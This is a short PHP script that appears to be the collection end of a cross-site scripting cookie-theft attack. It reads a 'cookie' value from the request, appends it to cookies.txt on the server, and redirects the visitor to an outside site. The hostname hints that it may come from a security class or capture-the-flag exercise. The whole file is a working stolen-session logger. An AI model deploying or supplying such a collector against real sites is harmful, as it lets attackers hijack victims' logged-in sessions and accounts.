<?php

if (isset($_REQUEST["cookie"])) {
  echo '1' + $_REQUEST["cookie"];
  $fp = fopen("cookies.txt", "a+");
  fwrite($fp, $_REQUEST["cookie"] . "\n");
  fclose($fp);
}
echo '2';
header("Location: http://kerberosclan.csec.chatzi.org/");
